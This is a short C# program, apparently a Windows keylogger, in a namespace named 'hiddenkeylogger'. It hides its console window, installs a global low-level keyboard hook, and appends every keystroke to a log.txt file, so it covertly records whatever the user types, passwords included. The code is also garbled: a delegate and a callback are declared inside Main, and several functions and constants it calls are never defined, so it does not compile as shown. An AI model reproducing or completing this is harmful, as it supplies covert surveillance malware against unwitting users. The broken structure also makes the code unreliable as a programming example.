using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace hiddenkeylogger
{
    class Program
    {
private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;
private static LowLevelKeyboardProc _proc = HookCallback;
private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
        
		var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
		
		   private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
        }
    }
}
